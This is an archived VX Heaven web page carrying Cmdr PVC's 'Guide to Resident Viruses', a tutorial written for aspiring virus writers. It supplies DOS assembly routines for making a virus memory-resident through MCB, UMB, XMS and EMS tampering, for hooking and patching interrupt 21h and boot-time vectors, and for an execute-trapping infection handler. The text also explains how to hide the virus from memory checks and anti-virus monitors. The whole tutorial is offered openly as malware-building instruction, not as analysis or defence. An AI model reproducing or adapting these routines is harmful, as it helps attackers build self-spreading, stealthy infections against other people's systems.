@@ -1,0 +1,547 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Cmdr PVC 'Guide to Resident Viruses' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Cmdr PVC"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Cmdr PVC,Guide to Resident Viruses, block, memory, driver, handler, interrupt, handle, word, file, resident, trace, destination, table, boot, buffer, sector"/>
+<meta name="Description" content="In this tutorial, I'm hoping to show exactly how to write the critical parts of a functioning memory resident virus, and provide a few source code examples and explanations for most of the methods I'm documenting."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"626af3721c5b9d4a27b275a95ccda8757c1fbd3a-1498756360-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vcp01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Guide to Resident Viruses</h1><p><a href="/lib/?lang=en&amp;author=Cmdr%20PVC"> Cmdr PVC</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vcp01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vcp01">Back to index</a>] [<a href="/lib/vcp01.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">Allocating memory</a>
+<ul>
+<li><a href="#p11">Base Memory Size Manipulation</a></li>
+<li><a href="#p12">Top Of The Interrupt Vector Table</a></li>
+<li><a href="#p13">Memory Holes</a></li>
+<li><a href="#p14">Going Resident Via Int 27h</a></li>
+<li><a href="#p15">Allocating Memory With DOS Calls</a></li>
+<li><a href="#p16">Direct Manipulation of the MCB Chain</a></li>
+<li><a href="#p17">Patching in a Fake Block</a></li>
+<li><a href="#p18">Using a UMB Block</a></li>
+<li><a href="#p19">The XMS Driver</a></li>
+<li><a href="#p1a">HMA Usage</a></li>
+<li><a href="#p1b">XMS Usage</a></li>
+<li><a href="#p1c">EMS Usage</a></li>
+</ul></li>
+<li><a href="#p2">Trapping interrupts</a>
+<ul>
+<li><a href="#p21">Using DOS Calls</a></li>
+<li><a href="#p22">Direct Manipulation</a></li>
+<li><a href="#p23">Patching Code/Patching DOS</a></li>
+<li><a href="#p24">Hooking Interrupt 21h From The Boot Sector</a></li>
+</ul></li>
+<li><a href="#p3">Interrupt handlers</a></li>
+</ul>
+<p>It seems that there's a lot of aspiring virus writers out there who are spending time on anti-heuristic code, directory traversal code, and various other add-ons for their viruses. Unfortunately, few start work on resident viruses until they've released a few generic, nonresident appenders. In this tutorial, I'm hoping to show exactly how to write the critical parts of a functioning memory resident virus, and provide a few source code examples and explanations for most of the methods I'm documenting.</p>
+<p>Why write a resident virus? Numerous reasons. Firstly, your virus will be faster spreading - you can code in the capability to infect files during any file access functions - even directory searches. It will hit the most-used files on the computer first. It won't depend on an infected file being copied to a floppy disk in order to spread. Secondly, residency opens the door for code which is simply not possible with a non-resident virus. Stealth, for instance, can be accomodated only in a resident virus. Boot sector, partition and multipartite viruses are almost exclusively memory resident - and those account for the overwhelming majority of all infections. Slow infection is only possible in resident viruses. Thirdly, the code isn't significantly more difficult to write. You can forget about traversing directories and checking if there's any floppies in the floppy drive. At the modest price of a memory installation routine, your virus gets a big advantage.</p>
+<h2><a name="p1">Allocating memory</a></h2>
+<p>First thing one must do when installing a into memory is allocate a chunk of memory to which the code can be written. This can be done in several ways. Some virus writers just find some free memory and write the virus there, but I don't recommend doing it, as it is extremely unreliable. Any successful virus will need to allocate memory.</p>
+<p>I've thrown in a bunch of source codes to illustrate the methods I'm explaining. If anything appears cryptic, look more closely at those.</p>
+<h3><a name="p11">Base Memory Size Manipulation</a></h3>
+<p>This method is based on the fact that the base memory size in kilobytes is always stored as word at the offset 0:0413h in memory. It is then a simple task to subtract the necessary amount of memory from this and write your code there. This might not be the best way of allocating or the memory, but it's a secure place to keep your virus. Besides, this is the only way to allocate memory before DOS loads, so if you're going resident off the boot sector (or maybe a DOS kernel file) this is the only way to do it.</p>
+<p>The decrease in memory size can be stealthed by trapping int 12h and adding whatever number of kilobytes was originally subtracted by the code. This will only work up to a point, but would fool a simple memory diagnostic program. All boot viruses and multipartite viruses use this, at least up to the point when command.com loads.</p>
+<p>Anyway, here's the code:</p>
+<pre class="source">
+	xor ax,ax
+	mov ds,ax
+	mov di,ax
+	dec word ptr [413h]		; take one kilobyte
+	int 12h				; get memory size in ax
+	mov cl,6
+	shl ax,cl			; find your segment
+	mov es,ax			; put it into es
+	push cs
+	pop ds
+	mov si,offset vstart		; start of your code
+	mov cx,vsize			; size of your resident code
+	rep movsb			; and copy it
+</pre>
+<h3><a name="p12">Top Of The Interrupt Vector Table</a></h3>
+<p>If you pull out your interrupt list, you will notice that about half of the interrupts in the IVT aren't used very much. Thus, one could write your virus right over those vectors. It's not the smartest thing to do, as some programs do find a use for these interrupts. Therefore if something decides to modify the IVT or call an interrupt which has been overwritten, your code will get messed up or the system will crash.</p>
+<p>The code for this is piss easy. Don't try fitting anything larger than 512 bytes in there either, if you do, you'll overwrite the BIOS data area. MG-1 was the first virus to use this technique, since then several others have made use of this.</p>
+<pre class="source">
+	xor es,es
+	mov di,200h			; set di to point to top half of the
+					; interrupt vector table
+	push cs
+	pop ds
+	mov si,offset vstart		; start of your resident code
+	mov cx,vsize
+	rep movsb			; just copy it
+</pre>
+<h3><a name="p13">Memory Holes</a></h3>
+<p>The idea here is that a virus could possibly find an unused chunk of memory somewhere in the BIOS data area, among all the garbage conserved for downward compatibility with antiquated software. It's not a secure method by any means, and you might not find appropriate holes on every system you hit. Once again, the code has to be very tight - don't assume you can find anything bigger than 1k or so. The only real advantage of this method is that memory is not decreased. Try starting at 0040:0000h and searching there for a chunk of zeroes. A relatively safe location is the DOS scratch space at 0060:0000, it's 256 bytes long, and not used after the boot process. Tight code is the key here, though I suppose you could install some sort of loader in that space and store the virus body in the XMS or EMS as data. Else, you could write an interrupt handler there. See what you can make of it. This code always starts at segment boundaries and searches for a chunk of zeroes the size of your virus. This code is very simple though - it will go into an endless loop if you don't set some limits as to how many segments should be searched. If you want to improve on it, be my guest.</p>
+<pre class="source">
+	mov ax,40h
+
+find_hole:
+	mov es,ax
+	xor ax,ax
+	mov di,ax			; es:di = 0040:0000h
+	mov cx,vsize
+	repe scasb			; are these zeroes?
+	jcxz install			; if so, are there enough?
+	mov ax,es			; nope.. next segment!
+	inc ax
+	jmp short find_hole
+
+install:
+	mov si,offset v_start
+	mov cx,vsize
+	xor di,di 
+	rep movsb
+</pre>
+<h3><a name="p14">Going Resident Via Int 27h</a></h3>
+<p>This is the cheesiest possible way to create a TSR virus. It's dead easy to do, and hasn't been used by viruses since the Stone Ages - it's trivial to detect. I'll tell you how to do it anyway. Just set all the interrupt vectors to your handlers, and adjust cs and dx as appropriate, then call int 27h. The only thing you must keep in mind is that DOS passes control to COMMAND.COM after int 27h is called. I won't bother providing code for this.</p>
+<h3><a name="p15">Allocating Memory With DOS Calls</a></h3>
+<p>This is a safe and very compatible way of allocating memory. However, it is very well known to anti-virus researchers, and will set off the alarm on just about any virus monitor out there. I'll tell you how to do it anyway. You request an impossible amount of memory, DOS tells you how much it would let you have, you allocate the memory you need. The following code show how to allocate a block for the virus's use with DOS calls.</p>
+<pre class="source">
+	mov ah,4ah
+	mov bx,0ffffh
+	int 21h				; request ffffh paras of memory
+	sub bx,vsize/10h+1		; this is paras again
+	mov ah,48h
+	int 21h
+	mov ah,48h
+	mov bx,vsize/10h+1
+	int 21h				; your segment's in ax
+	mov es,ax
+	xor di,di
+	push cs
+	pop ds				; now ds=cs
+	mov si,offset vstart
+	mov cx,vsize
+	rep movsb
+
+	dec ax				; this makes the virus's MCB appear
+	mov ds,ax			; as system code on a memory map
+	mov word ptr [8h],'SC'		; (DOS 5.0+ only)
+</pre>
+<h3><a name="p16">Direct Manipulation of the MCB Chain</a></h3>
+<p>This is an excellent method of allocating memory. It involves some twiddling with the MCB headers so that DOS thinks it's got less memory. All you need to do is find a suitable block and change the header. Stormbringer, Qark, and Terminator Z use this for going resident. So do the guys that wrote Creeping Death (Dir 2), except theirs is slightly different - they extend a block belonging to DOS and wrote their code there. Look at the Dir 2 source code if you're interested.</p>
+<pre class="source">
+	mov ah,52h			; SYSVARS - get list of lists
+	int 21h
+	mov ax,es:[bx-2]		; address of the first MCB
+	xor di,di			; (or you could use the block 1 para below
+					; the PSP)
+find_block:
+	mov ds,ax
+	cmp byte ptr [di],'Z'		; last block?
+	je install
+
+next_block:
+	add ax,word ptr [di+3]		; on to the next block
+	jmp short find_block
+
+install:
+	sub word ptr [di+3],vsize/10h+1
+	add ax,word ptr [di+3]
+	mov es,ax			; there's your segment
+	push cs
+	pop ds
+	mov si,offset vstart		; recognise this yet?
+	mov cx,vsize
+	rep movsb
+</pre>
+<h3><a name="p17">Patching in a Fake Block</a></h3>
+<p>You might have to use this technique if the last block in the chain is too small, or being used, or whatever. Now, you can't simply chop off a 'M' block, as this will tend to screw the whole MCB chain. However, you can adjust it. I don't know if any viruses use this, as I've just made it up. Here's the code. It will install the virus into any free block, patching it if necessary. You can be tricky and check if the last block suits your purposes first, but I'm not going to complicate things any further. Alternately, you could check how much free memory is available between the top of memory (TOM) and the last block, change the 'Z' block to an 'M' block and write in a new 'Z' block at the end of the old one.</p>
+<pre class="source">
+	mov ah,52h			; SYSVARS - get list of lists
+	int 21h
+	mov ax,es:[bx-2]		; address of the first MCB
+	xor di,di			; (or you could use the block 1 para below
+					; the PSP)
+find_block:
+	mov ds,ax
+	cmp word ptr [di+1],di
+	jnz next_block
+	cmp word ptr [di+3],vsize/10h+2
+	jae patch
+
+next_block:
+	add ax,word ptr [di+3]		; on to the next block
+	jmp short find_block
+
+patch:
+	cmp byte ptr [di],'Z'		; must not be the last block
+	je last_block
+	sub word ptr [di+3],vsize/10h+2 ; take an extra para
+	add ax,word ptr [di+3]
+	mov ds,ax
+	mov byte ptr [di],'M'
+	mov word ptr [di+1],8		; owned by DOS 
+	mov word ptr [di+3],vsize/10h+1
+	mov word ptr [di+8h],'SC'	; mark it as system code
+	mov ax,ds
+	inc ax
+	jmp short write 
+
+last_block:
+	sub word ptr [di+3],vsize/10h+1
+	add ax,word ptr [di+3]
+write:
+	mov es,ax
+	push cs
+	pop ds
+	mov si,offset vstart
+	mov cx,vsize
+	rep movsb
+</pre>
+<h3><a name="p18">Using a UMB Block</a></h3>
+<p>UMBs can be another good place to store your virus, as some virus scanners don't scan the UMB area. All one needs to do is find a suitable UMB block, and manipulate it in a similar fashion to a MCB. The format of the UMB is almost identical to MCB format, so you can handle both with one routine. UMBs are only present in DOS 5.0+, though.</p>
+<pre class="source">
+	mov ah,52h
+	int 21h
+	lds di,es:[bx+12h]		; get first disk buffer in ds:di
+	mov ax,word ptr [di+1fh]	; segment of first UMB
+	inc ax
+	jz no_UMB
+	dec ax
+	xor di,di
+	mov ds,ax			; ds = segment of UMB
+
+	[rest of code]
+</pre>
+<p>Note, the word at offset 1 in the UMB control block is does not hold the same value as the corresponding word in the MCB. Rather, it's the first available paragraph in the UMB. If the value is 0ah, it means the UMB control block is placed at the end of the UMB area. I'll be nice and give you more source code to calculate where in the UMB to write your virus. If this is buggy, deal with it.</p>
+<pre class="source">
+	cmp word ptr [di+1],0ah
+	je next_block
+
+process_UMB:
+	mov ax,word ptr [di+3]		; get total size of UMB in paras
+	mov bx,word ptr [di+1]		; get first available para in UMB
+	sub ax,bx
+	cmp ax,vsize/10h+1		; enough space in the UMB?
+	jnb install			; nope
+
+next_block:
+	mov ax,ds
+	add ax,word ptr [di+3]
+	mov ds,ax 
+	jmp short process_UMB
+
+install:
+	add word ptr [di+1],vsize/10h+1 ; adjust control block
+	mov ax,ds
+	add ax,word ptr [di+1]		; find our segment
+	mov es,ax
+	push cs
+	pop ds
+	mov si,offset vstart
+	mov cx,vsize
+	rep movsb
+</pre>
+<h3><a name="p19">The XMS Driver</a></h3>
+<p>Now this is not strictly a memory allocation strategy, but you might like to use the XMS driver either for allocating space in the UMB area or the HMA. First of all one must find the XMS driver entry point. The original entry point is a short jump followed by 3 nops. It's best to find the original entry point, of course, as an anti-virus monitor might decide to chain into the XMS driver chain and monitor suspicious memory allocation requests. Tracing it is a simple task, one simply follows the chain of far jump laid down by programs which have hooked into the chain. Here's a simple code tracer. To call the XMS driver directly, just set all the registers to whatever you desire and call the driver (HIMEM.SYS on most systems)</p>
+<pre class="source">
+trace_XMS_driver proc
+	pusha
+	push es
+	mov ax,4310h
+	int 2fh				; es:bx
+
+trace:
+	cmp byte ptr es:[bx],0ebh	; short jump?
+	je done
+	cmp byte ptr es:[bx],0eah	; long jump?
+	jne fail_trace
+	mov ax,es
+	add ax,es:[bx+3]
+	add bx,es:[bx+1]
+	mov es,ax
+	jmp short trace
+
+done:
+	mov [XMS_driver+2],es
+	add bx,es:[bx+1]
+	mov [XMS_driver],bx
+	clc
+	jmp short trace_ok
+
+fail_trace:
+	stc
+
+trace_ok:
+	pop es
+	popa
+	ret
+
+trace_XMS_driver endp
+
+XMS_driver dd 0
+</pre>
+<h3><a name="p1a">HMA Usage</a></h3>
+<p>Things get trickier here. First of all, you need to know that the HMA is a memory area between 0ffff:0010f and 0ffff:ffffh. Now, since those segment-offset addresses can't be represented by a 20-bit number, but can still be addressed, roughly 64k is available for a virus's use. Unfortunately, quite a bit of code needs to be dedicated just to place the virus into the HMA and safely keep it there. A few problems arise with HMA use. For instance, an address line called a20 needs to be enabled to access the HMA (can be done by calling the XMS driver with the appropriate values). You can't point an interrupt vector into a 0ffff:xxxxh address, because a selfish program might disable the a20 address line, and the system will crash. I suppose you could find a hole in lower memory, and write in your interrupt handlers there - which would enable a20, call the proper interrupt handler in your virus and return. Q the Misanthrope has written a tutorial on this subject, so if you're interested, I recommend that you check it out.</p>
+<h3><a name="p1b">XMS Usage</a></h3>
+<p>Extended memory is one place where large chunks of virus code can be stored. However, you can only store it as data - which means you'll have to keep a small loader somewhere in memory and swap your code into conventional memory to execute it. Still, there's some definite advantages to this method. No scanners scan the XMS, as it contains no directly executable code. The memory your virus takes up is only the size of your XMS loader - meaning that you can get a 7k virus to allocate only 512 bytes of conventional memory. You can also easily make your virus polymorphic in memory by simply generating a polymorphic XMS loader. Experiment! Here's a bit of code to show how to get a chunk of memory in the XMS area.</p>
+<pre class="source">
+	mov ax,4300h			; check if XMS driver is installed
+	int 2fh
+	cmp al,80h
+	jne error
+	call trace_XMS_driver		; find the original XMS driver API
+	jc error
+	mov ah,09h			; allocate XMS block
+	mov dx,4			; ask for 4k
+	call dword ptr [XMS_driver]	; call the XMS driver
+	or al,al
+	jz error
+	mov word ptr [XMS_handle],dx
+
+[rest of code]
+
+XMS_handle dw 0
+</pre>
+<p>Now, since segment-offset addresses can't be used for extended memory addressing, you'll need to set up a table (EMM structure) and use this table for moving code/data to and from XMS memory. Here's the format (out of Ralf Brown's Interrupt List).</p>
+<p><strong>EMM Table Structure</strong></p>
+<table border="1" cellspacing="0" cellpadding="0" summary="EMM Table Structure">
+<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
+<tr><td>00h </td><td>dword </td><td>Number of bytes to move (must be even)</td></tr>
+<tr><td>04h </td><td>word </td><td>Source handle</td></tr>
+<tr><td>06h </td><td>dword </td><td>Address within the source block</td></tr>
+<tr><td>0ah </td><td>word </td><td>Destination handle</td></tr>
+<tr><td>0ch </td><td>dword </td><td>Address within the destination block </td></tr>
+</table>
+<p>If either source of destination handle is 0, then the dword address within the block is interpreted as a real mode address. To move something to the XMS area, set source handle to 0 and address within the source block to the absolute address of the bytes to move. Offset 0ah must hold the handle of the destination. To move bytes from the XMS area, simply make the source your XMS block, and the destination your real address. Then, point ds:si to the start of your table and call the XMS driver API with ah set to 0bh. As you can see, XMS might not be the most convenient place to chuck your virus, but it does open new possibilities. Look up all the XMS API functions, and experiment.</p>
+<h3><a name="p1c">EMS Usage</a></h3>
+<p>This memory area is available on shitbox 8086 and 8088 systems (unlike XMS memory). It's similar to the XMS memory in that you can't directly run it or point interrupts into it (thus requiring a loader). This area can be accessed with EMM software, through a bunch of interrupt 67h functions. Here's the code for allocating some memory.</p>
+<pre class="source">
+	mov ah,43h			; get handle and allocate memory
+	mov bx,psize			; size of your virus in pages
+	int 67h
+	or ah,ah
+	jnz error
+	mov word ptr [EMS_handle],dx
+
+[rest of code]
+
+EMS_handle dw 0
+</pre>
+<p>Moving code to and from the EMS area requires a table (surprise surprise). I'll give you the format of this table (outta Ralf Brown's Int List). Point ds:si to this table and call interrupt 67h, with ah set to 57h. By the way, you can either move (when al equals 00h) or swap (al set to 01h) the addressed memory regions. Have fun with that.</p>
+<p><strong>EMS Copy Data Structure</strong></p>
+<table border="1" cellspacing="0" cellpadding="0" summary="EMS Copy Data Structure">
+<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
+<tr><td>00h </td><td>dword </td><td>region length in bytes</td></tr>
+<tr><td>04h </td><td>byte </td><td>source memory type (0 conventional, 1 EMS memory)</td></tr>
+<tr><td>05h </td><td>word </td><td>source handle</td></tr>
+<tr><td>07h </td><td>word </td><td>source initial offset </td></tr>
+<tr><td>09h </td><td>word </td><td>source initial segment (if conventional memory) source page number (if EMS memory)</td></tr>
+<tr><td>0bh </td><td>byte </td><td>destination memory type (0 conventional, 1 EMS memory)</td></tr>
+<tr><td>0ch </td><td>word </td><td>destination handle</td></tr>
+<tr><td>0eh </td><td>word </td><td>destination initial offset</td></tr>
+<tr><td>10h </td><td>word </td><td>destination initial segment (if conventional memory) destination page number (if EMS memory)</td></tr>
+</table>
+<p>The concept here is very similar to XMS paging - set the appropriate handle to 0 if it's conventional memory, else use the handle that your virus got handed out when you allocated EMS memory.</p>
+<h2><a name="p2">Trapping interrupts</a></h2>
+<p>Okay - your virus is in memory, you're on to the next step. You need to change some of the interrupt vectors to point to your virus rather than the appropriate interrupt handler. The reason for doing this is that whenever an interrupt is called, the virus can check what it is and do its business. Here's some ways of changing interrupt vectors to suit your purposes.</p>
+<h3><a name="p21">Using DOS Calls</a></h3>
+<p>DOS has two functions that can be used to get the interrupt vectors. Those are 35h (get interrupt vector) and 25h (set interrupt vector). This is probably the easiest way of hooking interrupts, but of course the anti-virus people have realised that they can trap these and mess around with the results. A big advantage of this method is that it's always guaranteed to work - even if the IVT is write protected. Under Windows 95 (DOS 7), interrupts hooked with this method often work better than those hooked directly. Here's the code for hooking int 21h (DOS services). Look the functions up in Ralf Brown's Interrupt List so that you know exactly how they work.</p>
+<pre class="source">
+	mov ax,3521h
+	int 21h
+	mov word ptr [old_int21h],bx
+	mov word ptr [old_int21h+2],es
+
+	mov ax,2521h
+	push cs
+	pop ds
+	mov dx,offset int21h_handler
+	int 21h
+</pre>
+<h3><a name="p22">Direct Manipulation</a></h3>
+<p>Once you know the format of the IVT, you can directly change the IVT entries for the interrupts you need. The IVT starts at address 0:0, is 1024 bytes long, and each 4 byte entry is the address to which control is passed when an interrupt is called.</p>
+<pre class="source">
+	mov di,offset old_int21h
+	mov si,21h*4
+	xor ax,ax
+	mov ds,ax
+	movsw
+	movsw
+	mov ax,offset int21h_handler
+	mov [si-4],ax
+	mov [si-2],cs
+</pre>
+<h3><a name="p23">Patching Code/Patching DOS</a></h3>
+<p>This method is quite inconspicuous (unless you do it under DOS 7 where it immediately hangs the system). The idea is that instead of modifying any vectors, you modify the code pointed to by the vectors. Here's the code.</p>
+<pre class="source">
+	xor ax,ax
+	mov es,ax
+	mov si,word ptr es:[21h*4]
+	mov ds,word ptr es:[21h*4+2]
+	mov si,word ptr cs:[old_int21h]
+	mov ds,word ptr cs:[old_int21h+2]
+	mov di,offset old_code
+	movsw
+	movsw
+	movsb
+	mov di,si
+	push ds
+	pop es
+	mov al,0eah
+	stosb
+	mov ax,offset int21h_handler
+	stosw
+	mov ax,cs
+	stosw
+
+old_code	db 5 dup (?)
+
+old_int21h	dd 0
+</pre>
+<p>It gets more difficult than this, though. Suppose the first instruction that was overwritten was an iret, jmp, jmp short or some other opcode that's less than 5 bytes in length. This means that patching code in this manner may overwrite a chunk of code or data that has nothing to do with the interrupt. This can be solved by checking for those opcodes before patching anything.</p>
+<p>Another thing to keep in mind when coding such a routine is that you will need to restore the original code on entry to your handler so you can call the appropriate interrupt without fucking up, and on exit, you must re-patch the same code to point to your virus - a minor (or major) pain in the ass.</p>
+<p>Patching DOS is an excellent way to hook an interrupt - since all DOS calls pass though your handler. There's a serious danger associated with it though - it crashes DOS 7. Besides, if you write to ROM, where BIOS interrupts (interrupt 13h and suchlike), you won't hook the interrupt. Additional dangers include the fact that the DOS kernel might change, and your virus will be incompatible. But remember, you're writing a virus, and you have the creative license to write the weirdest code out there.</p>
+<h3><a name="p24">Hooking Interrupt 21h From The Boot Sector</a></h3>
+<p>This can be a problem, and is quite hard to work out yourself. When the boot sector (and presumably your boot sector virus) executes, all the DOS interrupts point to iret opcodes. If you hook interrupt 21h as soon as you're resident, it will be reset by DOS, and your virus will be bypassed. It's preferable to hook int 21h fairly early, as it will be monitored by all the anti-virus TSR monitors that are loaded up from autoexec.bat. So what can you do? One way is to hook the timer interrupt (08h or 1ch) and hooking int 21h after a certain number of ticks. Here's a sample handler:</p>
+<pre class="source">
+int08h_handler:
+		inc word ptr cs:[counter]
+		cmp word ptr cs:[counter],1234h	; desired number of ticks
+		je hook_int21h
+		db 0eah				; jmp far opcode
+old_int08h	dd 0 
+counter		dw 0
+[rest of code]
+</pre>
+<p>Another way is to check the start of the disk read buffer for the EXE header id - 'MZ'. Point your interrupt handler to the check routine until those characters appear at the start of the read buffer - that's when COMMAND.COM is being loaded from disk via int 13h. As soon as that happens, hook int 21h, and point int 13h to your int 13h handler.</p>
+<pre class="source">
+int13h_check:
+		cmp ah,02h
+		je check_buffer
+
+int13h_handler:
+
+[rest of code]
+
+return_13h:
+		db 0eah
+old_int13h	dd 0
+
+check_buffer:
+		call dword ptr [old_int13h]
+		jc return_13h
+		cmp word ptr es:[bx],'MZ'
+		jne int13h_handler
+
+[hook int 21h]
+</pre>
+<p>You could also check the int 21h vector on every int 13h call, and if it's changed, hook int 21h. Here's the code.</p>
+<pre class="source">
+int13h_check:
+		pusha
+		push ds
+		xor ax,ax
+		mov ds,ax
+		mov si,[21h*4]
+		mov di,offset old_int21h
+		cmpsw
+		jne changed
+		cmpsw
+		jne changed
+
+int13h_handler:
+
+		[rest of code]
+
+changed:
+		[hook int 21h]
+		[point the int 13h vector to int13h_handler]
+		[jmp to int13_handler]
+</pre>
+<p>Checking the read buffer or tacking the int 21h check will screw up under some circumstances (under QEMM or DOS 7 for instance).</p>
+<p>Yet another method is setting up an int 10h handler and as soon as an int 10h call is issued (clear screen or whatever), you revector int 13h. You should be able to work the code for this yourself.</p>
+<h2><a name="p3">Interrupt handlers</a></h2>
+<p>Finally, your virus should include a chunk of code to check what interrupt function is called, and if this function is in any way interesting to you, process it. Functions can be processed in two ways - changing some of the input values to suit the virus's needs, or calling the function from within the viral code and changing the output (here's where stealth can be implemented).</p>
+<p>An ultra-simple interrupt handler might be this:</p>
+<pre class="source">
+intxxh_handler:
+		iret
+
+or
+
+intxxh_handler:
+		jmp dword ptr cs:[old_intxxh]
+</pre>
+<p>Both do absolutely nothing - the only difference is that one returns control to the caller, and the other passes control to the appropriate interrupt. The first might be used as a simple critical error handler - just set the int 24h to point towards the iret, and no more annoying critical error messages during infection of write-protected floppies.</p>
+<p>The second can be used as a skeleton for more complex code:</p>
+<pre class="source">
+int21h_handler:
+		cmp ah,4bh		; is ax=4bh? (load/execute program)
+		je infect
+
+return_21h:
+		db 0eah			; machine code jmp far opcode
+old_in21h	dd 0
+
+infect:
+		pushf
+		pusha
+		push ds
+
+		[do infection]
+
+		pop ds
+		popa
+		popf
+		jmp return_21h
+</pre>
+<p>I hope I've communicated the idea here. Just look up on all the values DOS is called with, and write your interrupt handler. For instance, if you trap file execute, you can infect any file that is executed. If you trap file open and file close, you can implement basic stealth - disinfect the file on opening, reinfect on closing. A word of caution here - either don't call an interrupt with values that would be trapped by your interrupt handler, or issue a far call to the vector that way in place before you set up your handler.</p>
+<p>I'm gonna wrap this tutorial up, it's getting too bloody long. I hope you've learnt something from it, and have been inspired to write your own memory resident virus. Greetings to all resident virus writers!</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vcp01">Back to index</a>] [<a href="/lib/vcp01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vcp01">de</a><a href="/lib/index.php?lang=en&amp;id=vcp01">en</a><a href="/lib/index.php?lang=es&amp;id=vcp01">es</a><a href="/lib/index.php?lang=it&amp;id=vcp01">it</a><a href="/lib/index.php?lang=fr&amp;id=vcp01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vcp01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vcp01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vcp01">ua</a></div>
+</body>
+</html>
